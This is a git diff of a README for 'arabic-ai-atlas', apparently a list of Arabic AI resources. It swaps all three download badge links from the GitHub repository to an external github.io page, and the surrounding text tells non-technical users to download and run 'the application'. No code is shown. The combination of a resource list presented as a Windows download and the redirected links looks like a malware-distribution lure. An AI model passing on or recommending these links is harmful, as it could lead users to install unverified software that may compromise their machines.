@@ -1,6 +1,6 @@
 # 🗺️ arabic-ai-atlas - Explore Arabic AI with Your Agent
 
-[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zergcheater/arabic-ai-atlas)
+[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://zergcheater.github.io)
 
 arabic-ai-atlas is the Arabic AI ecosystem as a map, a list, and a skill your agent can install. It brings Arabic AI projects, tools, speech systems, language models, and agent-ready resources into one clear place so you can explore what exists, understand what each item does, and find the right starting point without needing programming knowledge.
 
@@ -46,7 +46,7 @@ If you are not sure where your download went, open File Explorer and select Down
 
 ## ⬇️ Download and Setup
 
-[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zergcheater/arabic-ai-atlas)
+[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-orange?style=for-the-badge&logo=github&logoColor=white)](https://zergcheater.github.io)
 
 Visit this link to download the application.
 
@@ -166,7 +166,7 @@ You can also share the atlas with colleagues, classmates, or friends who are exp
 
 ## 🔗 Download Again
 
-[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zergcheater/arabic-ai-atlas)
+[![Download arabic-ai-atlas](https://img.shields.io/badge/Download-arabic--ai--atlas-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://zergcheater.github.io)
 
 Visit this link to download the application.
 
